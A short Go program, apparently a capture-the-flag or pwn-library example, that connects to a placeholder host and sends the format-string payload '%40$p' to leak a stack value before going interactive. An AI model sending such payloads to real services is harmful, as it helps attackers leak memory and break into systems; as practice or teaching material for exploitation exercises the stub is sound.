package main

import "github.com/yuratwc/ezpwngo"

func main() {
	c := ezpwngo.NewPwnClient("xxxxx:25555", true)
	if err := c.Connect(); err != nil {
		panic(err)
	}
	defer c.Close()
	c.RecvLine()
	c.SendLine("%40$p\n")
	c.StartInteractive()
}
